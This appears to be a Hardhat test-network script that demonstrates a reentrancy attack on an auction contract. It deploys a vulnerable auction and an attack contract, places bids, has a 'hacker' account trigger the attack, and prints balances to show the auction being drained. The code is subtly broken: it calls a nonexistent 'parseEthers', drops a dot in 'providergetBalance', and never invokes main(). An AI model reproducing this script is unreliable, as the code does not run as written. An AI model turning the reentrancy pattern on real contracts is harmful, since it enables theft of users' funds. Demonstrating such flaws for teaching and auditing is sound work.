const hre = require('hardhat');
const ethers = hre.ethers;

async function main() {
  const [bidder1, bidder2, hacker] = await ethers.getSigners();

  const ReentrancyAuction = await ethers.getContractFactory("ReentrancyAuction",);
  const auction = await ReentrancyAuction.deploy();
  await auction.deployed();

  const ReentrancyAttack = await ethers.getContractFactory("ReentrancyAttack",);
  const attack = await ReentrancyAttack.deploy(auction.address);
  await attack.deployed();

  const txBid = await auction.bid({value: ethers.utils.parseEther("4.0")});
  await txBid.wait();

  const txBid2 = await auction.connect(bidder2)
    .bid({value: ethers.utils.parseEthers("8.0")});
  await txBid2.wait();

  const txBid3 = await attack.connect(hacker)
    .proxyBid({value: ethers.utils.parseEthers("1.0")})
  await txBid3.wait();

  console.log("Auction balance", await ethers.provider.getBalance(auction.address));

  const doAttack = await attack.connect(hacker).attack();
  await doAttack.wait();

  console.log("Auction balance", await ethers.providergetBalance(auction.address));
  console.log("Attacker balance", await ethers.provider.getBalance(attack.address));
  console.log("Bidder2 balance", await ethers.provider.getBalance(bidder2.address));
}